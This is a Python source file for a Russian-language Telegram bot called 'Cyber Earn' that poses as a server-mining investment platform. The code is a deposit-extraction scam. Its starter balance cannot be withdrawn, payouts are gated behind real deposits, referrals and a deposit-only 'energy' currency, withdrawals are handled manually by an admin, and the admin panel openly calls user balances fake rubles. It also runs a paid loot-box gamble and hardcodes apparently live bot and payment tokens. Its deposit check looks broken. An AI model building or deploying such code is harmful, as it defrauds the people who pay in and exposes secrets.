import asyncio
import logging
import sqlite3
import time
import random
import os
import sys

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery, 
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.filters import Command, CommandStart
from yoomoney import Client

# =====================================================================
#                        ОСНОВНЫЕ НАСТРОЙКИ
# =====================================================================
# ВСТАВЬ СЮДА СВОИ ДАННЫЕ МЕЖДУ КАВЫЧКАМИ (" ")
BOT_TOKEN = "8727966393:AAENOC9N7CofxMct5WWuZDtpqyrl__Bwea4"

ADMIN_ID = 5494544187  # Твой ID в Telegram (БЕЗ кавычек, только цифры)
SUPPORT_USERNAME = "@vladofix28" # Твой юзернейм для выплат

YOOMONEY_WALLET = "4100118935779591"  # Номер кошелька (15 цифр)
YOOMONEY_TOKEN = "5133D1719448E2A5E1083A0FC605E369944CBB992B1D4490F13E2D4636C03191"  # Длинный токен от Юmoney
# =====================================================================


# Настройка логирования (чтобы видеть ошибки в консоли хостинга)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Умная настройка пути для Базы Данных (специально для твоего хостинга)
if os.path.exists('/app/data'):
    DB_PATH = '/app/data/cyber_invest.db'
else:
    DB_PATH = 'cyber_invest.db'

logging.info(f"📁 База данных будет сохранена по пути: {DB_PATH}")

# ================= БАЗА ДАННЫХ =================
try:
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users
                      (user_id INTEGER PRIMARY KEY, 
                       username TEXT, 
                       crypto INTEGER DEFAULT 0,        
                       rub_balance REAL DEFAULT 500,    
                       energy REAL DEFAULT 0,           
                       mining_rate INTEGER DEFAULT 250, 
                       referrer_id INTEGER DEFAULT 0,   
                       last_login INTEGER,
                       last_bonus INTEGER DEFAULT 0,
                       total_deposited REAL DEFAULT 0)''')
    conn.commit()
except Exception as e:
    logging.critical(f"❌ Ошибка создания базы данных: {e}")
    sys.exit(1)

# ================= ЭКОНОМИКА И КАТАЛОГ =================
MIN_WITHDRAW = 1000 
MIN_DEPOSIT_TO_WITHDRAW = 500 # Мин. депозит для верификации (защита от школьников)
CRYPTO_RATE = 10000 
CASE_PRICE_RUB = 50 

SERVERS_CATALOG = {
    "srv_1": {"name": "🖥 Базовый VDS", "price": 150, "income": 250},
    "srv_2": {"name": "🗄 Сервер Dedic", "price": 500, "income": 900},
    "srv_3": {"name": "⚡️ GPU-Ферма", "price": 1500, "income": 3000},
    "srv_4": {"name": "🌌 Квантовый AI", "price": 5000, "income": 12000}
}

# ================= ИНИЦИАЛИЗАЦИЯ =================
try:
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()
    ym_client = Client(YOOMONEY_TOKEN)
except Exception as e:
    logging.critical(f"❌ ОШИБКА ТОКЕНОВ! Проверь BOT_TOKEN и YOOMONEY_TOKEN. Подробности: {e}")
    sys.exit(1)

def get_main_keyboard():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="💻 Личный Кабинет"), KeyboardButton(text="🚀 Каталог Серверов")],
        [KeyboardButton(text="💳 Пополнить Баланс"), KeyboardButton(text="💸 Вывод Средств")],
        [KeyboardButton(text="🔄 Биржа (Обмен)"), KeyboardButton(text="🎁 Ежедневный Бонус")],
        [KeyboardButton(text="📦 Крипто-Бокс"), KeyboardButton(text="👥 Партнерам")]
    ], resize_keyboard=True)

def collect_income(user_id):
    cursor.execute("SELECT last_login, mining_rate FROM users WHERE user_id=?", (user_id,))
    row = cursor.fetchone()
    if not row: return 0
    last_login, mining_rate = row
    current_time = int(time.time())
    hours_passed = min((current_time - last_login) / 3600.0, 24) 
    income = int(hours_passed * mining_rate) 
    if income > 0:
        cursor.execute("UPDATE users SET crypto = crypto + ?, last_login = ? WHERE user_id=?", (income, current_time, user_id))
        conn.commit()
    return income

# ================= ХЭНДЛЕРЫ =================

@dp.message(CommandStart())
async def cmd_start(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or f"User_{user_id}"
    ref_id = 0
    args = message.text.split()
    if len(args) > 1 and args[1].isdigit():
        ref_id = int(args[1])
        if ref_id == user_id: ref_id = 0 

    cursor.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
    if not cursor.fetchone():
        cursor.execute("INSERT INTO users (user_id, username, last_login, referrer_id) VALUES (?, ?, ?, ?)", (user_id, username, int(time.time()), ref_id))
        conn.commit()
        if ref_id > 0:
            try: await bot.send_message(ref_id, "🤝 <b>Новый инвестор по вашей ссылке!</b> (+10% с его пополнений).", parse_mode="HTML")
            except: pass
            
        await message.answer(
            "🎁 <b>Вам начислен стартовый грант!</b>\n\n"
            "✅ <b>1 Базовый Сервер</b>\n"
            "✅ <b>500.00 ₽</b> на счет вывода!\n\n"
            "<i>(Вы можете начать зарабатывать прямо сейчас без вложений)</i>", parse_mode="HTML"
        )
        await asyncio.sleep(1)

    await message.answer("🌐 <b>Добро пожаловать в Cyber Earn!</b>\nРазвивайте мощности и выводите реальные деньги.", parse_mode="HTML", reply_markup=get_main_keyboard())

@dp.message(F.text == "💻 Личный Кабинет")
async def show_profile(message: Message):
    user_id = message.from_user.id
    income = collect_income(user_id)
    cursor.execute("SELECT crypto, rub_balance, energy, mining_rate FROM users WHERE user_id=?", (user_id,))
    crypto, rub, energy, mining_rate = cursor.fetchone()
    rub_per_day = (mining_rate * 24) / CRYPTO_RATE

    text = (
        f"📊 <b>Ваш Профиль:</b>\n"
        f"➖➖➖➖➖➖➖➖➖➖\n"
        f"💳 Баланс: <b>{rub:.2f} ₽</b> <i>(Мин: {MIN_WITHDRAW} ₽)</i>\n"
        f"💠 Крипта: <b>{crypto:,}</b>\n"
        f"⚡️ Энергия Сети: <b>{energy:.2f} ⚡️</b>\n\n"
        f"📈 Мощность серверов: <b>{mining_rate:,} 💠 / час</b>\n"
        f"💵 Доходность: <b>~{rub_per_day:.2f} ₽ / день</b>\n"
        f"➖➖➖➖➖➖➖➖➖➖\n"
    )
    if income > 0: text += f"\n<i>✅ Сервера намайнили: +{income:,} 💠</i>"
    await message.answer(text, parse_mode="HTML")

@dp.message(F.text == "🚀 Каталог Серверов")
async def shop_menu(message: Message):
    user_id = message.from_user.id
    collect_income(user_id)
    cursor.execute("SELECT rub_balance, mining_rate FROM users WHERE user_id=?", (user_id,))
    rub, mining_rate = cursor.fetchone()
    
    keyboard = []
    text_info = "🚀 <b>Каталог Оборудования</b>\n\n"
    
    for key, srv in SERVERS_CATALOG.items():
        text_info += f"{srv['name']}\n💰 Цена: <b>{srv['price']} ₽</b>\n⚡️ Доход: <b>{srv['income']} 💠/час</b>\n\n"
        keyboard.append([InlineKeyboardButton(text=f"Купить {srv['name']} - {srv['price']} ₽", callback_data=f"buy_{key}")])
        
    text_info += f"<i>Ваш баланс: {rub:.2f} ₽</i>\n<i>Текущая мощность: {mining_rate} 💠/час</i>"
    
    kb = InlineKeyboardMarkup(inline_keyboard=keyboard)
    await message.answer(text_info, parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data.startswith("buy_srv_"))
async def process_buy_server(callback: CallbackQuery):
    srv_key = callback.data.replace("buy_", "")
    srv = SERVERS_CATALOG[srv_key]
    user_id = callback.from_user.id
    cursor.execute("SELECT rub_balance FROM users WHERE user_id=?", (user_id,))
    rub = cursor.fetchone()[0]
    
    if rub < srv['price']: return await callback.answer("❌ Недостаточно рублей на балансе!", show_alert=True)
        
    cursor.execute("UPDATE users SET rub_balance = rub_balance - ?, mining_rate = mining_rate + ? WHERE user_id=?", (srv['price'], srv['income'], user_id))
    conn.commit()
    await callback.message.edit_text(f"✅ <b>Успешно!</b> Вы приобрели <b>{srv['name']}</b>.", parse_mode="HTML")

@dp.message(F.text == "🎁 Ежедневный Бонус")
async def daily_bonus(message: Message):
    user_id = message.from_user.id
    current_time = int(time.time())
    cursor.execute("SELECT last_bonus FROM users WHERE user_id=?", (user_id,))
    if current_time - cursor.fetchone()[0] < 86400: return await message.answer("⏳ Бонус уже получен. Возвращайтесь завтра.")
    bonus_rub = random.randint(10, 40)
    cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, last_bonus = ? WHERE user_id=?", (bonus_rub, current_time, user_id))
    conn.commit()
    await message.answer(f"🎁 <b>Начислено {bonus_rub} ₽ на баланс!</b>", parse_mode="HTML")

@dp.message(F.text == "📦 Крипто-Бокс")
async def case_menu(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"Открыть за {CASE_PRICE_RUB} ₽", callback_data="open_case")]])
    await message.answer("📦 <b>Секретный Бокс</b>\nРискните балансом, чтобы выиграть Энергию Сети или мощности!\n" f"<i>Цена: {CASE_PRICE_RUB} ₽</i>", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "open_case")
async def open_case(callback: CallbackQuery):
    user_id = callback.from_user.id
    cursor.execute("SELECT rub_balance FROM users WHERE user_id=?", (user_id,))
    if cursor.fetchone()[0] < CASE_PRICE_RUB: return await callback.answer("❌ Не хватает рублей!", show_alert=True)
    cursor.execute("UPDATE users SET rub_balance = rub_balance - ? WHERE user_id=?", (CASE_PRICE_RUB, user_id))
    roll = random.randint(1, 100)
    if roll <= 75:
        crypto_prize = random.randint(15000, 40000)
        cursor.execute("UPDATE users SET crypto = crypto + ? WHERE user_id=?", (crypto_prize, user_id))
        msg = f"💎 Выпало: <b>{crypto_prize:,} 💠 Крипты!</b>"
    elif roll <= 95:
        cursor.execute("UPDATE users SET mining_rate = mining_rate + 250 WHERE user_id=?", (user_id,))
        msg = f"🖥 Выигран <b>Базовый Сервер (+250 💠/час)!</b>"
    else:
        cursor.execute("UPDATE users SET energy = energy + 10 WHERE user_id=?", (user_id,))
        msg = f"⚡️ <b>ДЖЕКПОТ! +10 Энергии Сети!</b>"
    conn.commit()
    await callback.message.edit_text(f"📦 Распаковка...\n\n{msg}", parse_mode="HTML")

@dp.message(F.text == "🔄 Биржа (Обмен)")
async def exchange_menu(message: Message):
    user_id = message.from_user.id
    collect_income(user_id)
    cursor.execute("SELECT crypto FROM users WHERE user_id=?", (user_id,))
    crypto = cursor.fetchone()[0]
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Обменять всю Крипту", callback_data="exchange_all")]])
    await message.answer(f"🔄 <b>Биржа Крипты</b>\nКурс: {CRYPTO_RATE} 💠 = 1 ₽\nУ вас: <b>{crypto:,} 💠</b>\nК получению: <b>{(crypto / CRYPTO_RATE):.2f} ₽</b>", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "exchange_all")
async def process_exchange(callback: CallbackQuery):
    user_id = callback.from_user.id
    cursor.execute("SELECT crypto FROM users WHERE user_id=?", (user_id,))
    crypto = cursor.fetchone()[0]
    if crypto < CRYPTO_RATE: return await callback.answer("❌ Минимальная сумма обмена не достигнута.", show_alert=True)
    rub_to_add = crypto / CRYPTO_RATE
    cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, crypto = 0 WHERE user_id=?", (rub_to_add, user_id))
    conn.commit()
    await callback.message.edit_text(f"✅ Средства зачислены на баланс: <b>+{rub_to_add:.2f} ₽</b>.", parse_mode="HTML")

@dp.message(F.text == "💳 Пополнить Баланс")
async def deposit_menu(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="500 ₽ (Открывает выводы)", callback_data="dep_500")],
        [InlineKeyboardButton(text="1500 ₽ (+35% Энергии)", callback_data="dep_1500")],
        [InlineKeyboardButton(text="5000 ₽ (+40% Энергии)", callback_data="dep_5000")]
    ])
    await message.answer("💳 <b>Защищенное пополнение (ЮMoney)</b>\nВы получаете рубли для покупок и Энергию Сети для вывода.", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data.startswith("dep_"))
async def create_deposit(callback: CallbackQuery):
    amount = int(callback.data.replace("dep_", ""))
    label = f"dep_{amount}_{callback.from_user.id}_{int(time.time())}"
    pay_url = f"https://yoomoney.ru/quickpay/confirm.xml?receiver={YOOMONEY_WALLET}&quickpay-form=shop&targets=Инвестиция&paymentType=AC&sum={amount}&label={label}"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 Оплатить {amount} ₽", url=pay_url)],
        [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"chkdep_{label}")]
    ])
    await callback.message.edit_text("Оплата обрабатывается официальным шлюзом.", reply_markup=kb)

@dp.callback_query(F.data.startswith("chkdep_"))
async def check_deposit(callback: CallbackQuery):
    label = callback.data.replace("chkdep_", "")
    amount = int(label.split("_")[0])
    user_id = int(label.split("_")[1])
    try:
        history = ym_client.operation_history(label=label)
        for op in history.operations:
            if op.status == 'success':
                energy_gain = amount * (0.30 if amount < 1500 else (0.35 if amount < 5000 else 0.40))
                cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, energy = energy + ?, total_deposited = total_deposited + ? WHERE user_id=?", 
                               (amount, energy_gain, amount, user_id))
                
                cursor.execute("SELECT referrer_id FROM users WHERE user_id=?", (user_id,))
                ref_id = cursor.fetchone()[0]
                if ref_id > 0:
                    ref_bonus = amount * 0.10
                    cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, energy = energy + ? WHERE user_id=?", (ref_bonus, ref_bonus, ref_id))
                    try: await bot.send_message(ref_id, f"🎉 <b>Бонус от партнера!</b> Зачислено <b>{ref_bonus} ₽</b> и Энергия.", parse_mode="HTML")
                    except: pass
                conn.commit()
                return await callback.message.edit_text(f"✅ <b>Платеж успешно зачислен!</b>\nПоступило: {amount} ₽", parse_mode="HTML")
        await callback.answer("❌ Платеж не найден.", show_alert=True)
    except Exception as e: 
        logging.error(f"Ошибка Юmoney: {e}")
        await callback.answer("⚠️ Ошибка связи с ЮMoney.", show_alert=True)

@dp.message(F.text == "👥 Партнерам")
async def ref_menu(message: Message):
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={message.from_user.id}"
    text = (
        f"👥 <b>Партнерская сеть</b>\n\n"
        f"Приглашайте друзей. Вы будете получать <b>10% от их депозитов</b> на баланс и +10% к Энергии Сети!\n\n"
        f"🔗 <b>Ваша ссылка:</b>\n<code>{ref_link}</code>"
    )
    await message.answer(text, parse_mode="HTML")

@dp.message(F.text == "💸 Вывод Средств")
async def withdraw_request(message: Message):
    user_id = message.from_user.id
    cursor.execute("SELECT rub_balance, energy, total_deposited FROM users WHERE user_id=?", (user_id,))
    rub, energy, total_dep = cursor.fetchone()
    
    if rub < MIN_WITHDRAW: 
        return await message.answer(f"❌ Минимальная сумма вывода: <b>{MIN_WITHDRAW} ₽</b>", parse_mode="HTML")
    
    if total_dep < MIN_DEPOSIT_TO_WITHDRAW:
        return await message.answer(f"⚠️ <b>Верификация Кошелька</b>\n\nДля активации выплат и защиты от ботов, совершите единоразовое пополнение минимум на <b>{MIN_DEPOSIT_TO_WITHDRAW} ₽</b>.", parse_mode="HTML")

    if energy < MIN_WITHDRAW:
        return await message.answer(f"🛡 <b>Защита Anti-Fraud</b>\n\nНедостаточно Энергии Сети для выплаты.\nДоступно: <b>{energy:.2f} ₽</b> (Нужно: {MIN_WITHDRAW} ₽)\n\n<i>Пригласите активных партнеров или совершите депозит.</i>", parse_mode="HTML")
        
    req_code = f"WD-{user_id}-{int(time.time())}"
    cursor.execute("UPDATE users SET rub_balance = rub_balance - ?, energy = energy - ? WHERE user_id=?", (MIN_WITHDRAW, MIN_WITHDRAW, user_id))
    conn.commit()
    
    await message.answer(f"✅ <b>Заявка на выплату {MIN_WITHDRAW} ₽ принята!</b>\n\nКод: <code>{req_code}</code>\n\nНапишите админу: {SUPPORT_USERNAME} и прикрепите код для перевода.", parse_mode="HTML")
    await bot.send_message(ADMIN_ID, f"💰 <b>ВЫПЛАТА!</b>\nЮзер: @{message.from_user.username}\nСумма: {MIN_WITHDRAW} ₽\nКод: {req_code}")

@dp.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID: return
    cursor.execute("SELECT COUNT(*), SUM(rub_balance), SUM(energy), SUM(total_deposited) FROM users")
    users_count, total_rub, total_energy, total_dep = cursor.fetchone()
    text = (
        f"👑 <b>АДМИНКА</b>\n\n"
        f"👥 Игроков: <b>{users_count}</b>\n"
        f"💰 Фейк-Рублей: <b>{total_rub or 0:.2f} ₽</b>\n"
        f"⚡️ Энергии (риск): <b>{total_energy or 0:.2f} ₽</b>\n\n"
        f"💵 <b>РЕАЛЬНЫХ ДОНАТОВ В БОТА: {total_dep or 0:.2f} ₽</b>"
    )
    await message.answer(text, parse_mode="HTML")

async def main():
    logging.info("🚀 Бот запускается...")
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
    except Exception as e:
        logging.critical(f"Критическая ошибка запуска: {e}")

if __name__ == "__main__":
    asyncio.run(main())
